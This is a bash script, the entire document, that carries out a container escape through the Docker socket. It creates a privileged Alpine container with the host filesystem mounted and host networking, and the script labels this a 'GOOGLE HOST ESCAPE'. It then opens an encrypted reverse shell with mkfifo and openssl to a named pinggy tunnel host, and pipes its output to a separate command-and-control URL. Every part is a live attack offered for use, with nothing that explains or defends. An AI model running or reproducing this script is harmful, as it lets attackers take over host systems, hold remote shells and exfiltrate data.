#!/bin/bash
# TARGET: dgyhk-103-95-173-105.a.free.pinggy.link:42777
P_URL="dgyhk-103-95-173-105.a.free.pinggy.link"
P_PORT="42777"
C2_URL="417a97eeaad6dddf-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] GOOGLE HOST ESCAPE: PINGGY ACTIVE ==="
  
  # 1. Create the 'Super-Privileged' Container
  # This maps host root (/) to /host and gives us the Host Network
  RESP=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
    -H "Content-Type: application/json" \
    -d "{
      \"Image\": \"alpine:latest\",
      \"HostConfig\": {
        \"Binds\": [\"/:/host:ro\"],
        \"Privileged\": true,
        \"NetworkMode\": \"host\"
      }
    }")
  
  ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)

  if [ -n "$ID" ]; then
    echo "[+] Escape Container $ID created."
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
    
    # 2. TRIGGER THE ENCRYPTED SHELL (OPENSSL)
    echo "[!] Launching Secure Bridge to Pinggy..."
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
      -d "{
        \"Cmd\": [\"sh\", \"-c\", \"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $P_URL:$P_PORT > /tmp/s; rm /tmp/s\"]
      }" &
  else
    echo "[!] Failed to create container. Check Docker Socket."
  fi

} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
